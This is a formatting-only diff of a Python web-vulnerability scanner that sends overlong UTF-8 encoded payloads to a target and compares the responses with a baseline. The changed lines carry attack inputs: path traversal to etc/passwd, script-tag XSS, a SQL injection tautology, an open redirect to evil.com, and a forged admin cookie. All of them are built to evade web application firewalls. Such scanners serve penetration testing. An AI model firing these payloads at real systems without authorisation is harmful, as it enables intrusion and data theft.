@@ -323,7 +323,9 @@ async def _test_overlong_url(
                             status_changed=status_changed,
                             size_changed=size_changed,
                             vulnerable=vulnerable,
-                            details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                            details=f"Status {b_status}->{t_status}"
+                            if status_changed
+                            else "Sem mudanca",
                             error="",
                             exploit="overlong_utf8_payload" if vulnerable else "",
                             tool="wfuzz",
@@ -370,7 +372,13 @@ async def _test_overlong_params(
     test_payloads = [
         ("overlong_get", "GET", {"q": f"test{_overlong_2byte('/')}admin"}),
         ("overlong_post", "POST", {"field": f"value{_overlong_2byte('<')}script"}),
-        ("overlong_json", "JSON", {"data": f"payload{_overlong_3byte('\\')}..%e0%80%afe0%80%afetc%e0%80%afpasswd"}),
+        (
+            "overlong_json",
+            "JSON",
+            {
+                "data": f"payload{_overlong_3byte('\\')}..%e0%80%afe0%80%afetc%e0%80%afpasswd"
+            },
+        ),
     ]
 
     for technique, method, data in test_payloads:
@@ -410,7 +418,9 @@ async def _test_overlong_params(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="overlong_utf8_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -451,14 +461,24 @@ async def _test_overlong_headers(
     b_status, b_size, _ = baseline
 
     header_payloads = [
-        ("overlong_referer", "Referer", f"https://example.com{_overlong_2byte('/')}admin"),
+        (
+            "overlong_referer",
+            "Referer",
+            f"https://example.com{_overlong_2byte('/')}admin",
+        ),
         ("overlong_cookie", "Cookie", f"session=abc{_overlong_2byte(';')}admin=true"),
-        ("overlong_ua", "User-Agent", f"Mozilla/5.0{_overlong_2byte('<')}script{_overlong_2byte('>')}"),
+        (
+            "overlong_ua",
+            "User-Agent",
+            f"Mozilla/5.0{_overlong_2byte('<')}script{_overlong_2byte('>')}",
+        ),
     ]
 
     for technique, header_name, header_value in header_payloads:
         try:
-            resp = await client.get(url, headers={header_name: header_value}, follow_redirects=False)
+            resp = await client.get(
+                url, headers={header_name: header_value}, follow_redirects=False
+            )
 
             t_status = resp.status_code
 
@@ -481,7 +501,9 @@ async def _test_overlong_headers(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="overlong_utf8_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -526,8 +548,14 @@ async def _test_overlong_waf(
             "overlong_xss",
             f"{_overlong_2byte('<')}script{_overlong_2byte('>')}alert(1){_overlong_2byte('<')}{_overlong_2byte('/')}{_overlong_2byte('>')}script{_overlong_2byte('>')}",
         ),
-        ("overlong_sqli", f"{_overlong_2byte('\\')}{_overlong_2byte('\\')} OR 1{_overlong_2byte('=')}1{_overlong_2byte('\\')}{_overlong_2byte('\\')}"),
-        ("overlong_redirect", f"http:{_overlong_2byte('/')}{_overlong_2byte('/')}evil.com"),
+        (
+            "overlong_sqli",
+            f"{_overlong_2byte('\\')}{_overlong_2byte('\\')} OR 1{_overlong_2byte('=')}1{_overlong_2byte('\\')}{_overlong_2byte('\\')}",
+        ),
+        (
+            "overlong_redirect",
+            f"http:{_overlong_2byte('/')}{_overlong_2byte('/')}evil.com",
+        ),
     ]
 
     parsed = urlparse(url)
@@ -536,7 +564,9 @@ async def _test_overlong_waf(
 
     for technique, payload in waf_payloads:
         try:
-            resp = await client.get(base_url, params={"input": payload}, follow_redirects=False)
+            resp = await client.get(
+                base_url, params={"input": payload}, follow_redirects=False
+            )
 
             t_status = resp.status_code
 
@@ -559,7 +589,9 @@ async def _test_overlong_waf(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="overlong_utf8_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -714,7 +746,12 @@ def print_results_fn(result: OverlongResult) -> None:
 
     print(color(f"  Target: {result.target}", Cyber.WHITE))
 
-    print(color(f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
+    print(
+        color(
+            f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.GRAY,
+        )
+    )
 
     print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))
 
